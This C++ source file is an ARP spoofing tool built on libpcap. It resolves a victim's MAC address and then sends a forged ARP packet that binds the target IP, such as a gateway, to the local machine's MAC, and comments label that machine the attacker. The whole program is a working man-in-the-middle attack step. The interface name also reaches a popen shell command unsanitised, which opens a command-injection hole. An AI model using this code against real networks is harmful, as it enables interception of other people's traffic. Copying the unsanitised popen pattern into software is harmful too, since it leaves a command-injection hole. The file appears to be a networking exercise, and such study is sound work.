#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <fstream>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp-test wlan0 172.20.10.3 172.20.10.1\n");
}

const std::string get_ip_address(const char *interface_name) {
    std::string ip_address;
    std::string command = "ip addr show " + std::string(interface_name);
    FILE *pipe = popen(command.c_str(), "r");
    if (!pipe) {
        std::cerr << "Error: Failed to execute command to get IP address." << std::endl;
        return "";
    }
    char buffer[128];
    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != nullptr) {
            std::string line(buffer);
            size_t pos = line.find("inet ");
            if (pos != std::string::npos) {
                size_t end_pos = line.find("/", pos + 5);
                if (end_pos != std::string::npos) {
                    ip_address = line.substr(pos + 5, end_pos - pos - 5);
                    break;
                }
            }
        }
    }
    pclose(pipe);
    return ip_address;
}

const std::string get_mac_address(const char *interface_name) {
    std::string mac_address;
    std::ifstream file("/sys/class/net/" + std::string(interface_name) + "/address");
    if (file.is_open()) {
        std::getline(file, mac_address);
    } else {
        std::cerr << "Error: Failed to open file for interface " << interface_name << std::endl;
    }
    return mac_address;
}


int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char* sender_ip = argv[2];
    char* target_ip = argv[3];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = Mac(get_mac_address(dev)); // attacker address
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(get_mac_address(dev)); // attacker MAC address
    packet.arp_.sip_ = htonl(Ip(get_ip_address(dev))); // attacker IP
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(sender_ip)); // sender IP

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    printf("Arp request sent. Waiting for ARP response... \n");

    sleep(3);

    struct pcap_pkthdr* header;
    const u_char* packet_data;
    Mac sender_mac;
    int reply = pcap_next_ex(handle, &header, &packet_data);
    if (reply == 1) {
        // ARP reply
        printf("ARP Reply detected!\n");
        EthArpPacket* arp_packet = (EthArpPacket*)packet_data;
        sender_mac = arp_packet->arp_.smac_;
    } else if (reply == 0) {
        // timeout error
        printf("No ARP response received.\n");
    } else if (reply == -1) {
        // pcap_next_ex error
        fprintf(stderr, "Error reading the packet: %s\n", pcap_geterr(handle));
        return 2;
    }


    pcap_t* handle_2 = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    packet.eth_.dmac_ = sender_mac; //sender_MAC_address
    packet.eth_.smac_ = Mac(get_mac_address(dev));
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(get_mac_address(dev));
    packet.arp_.sip_ = htonl(Ip(target_ip));
    packet.arp_.tmac_ = sender_mac; //sender_MAC_address
    packet.arp_.tip_ = htonl(Ip(sender_ip));


    int res_ = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res_ != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_, pcap_geterr(handle));
    }

    pcap_close(handle);
    pcap_close(handle_2);
}
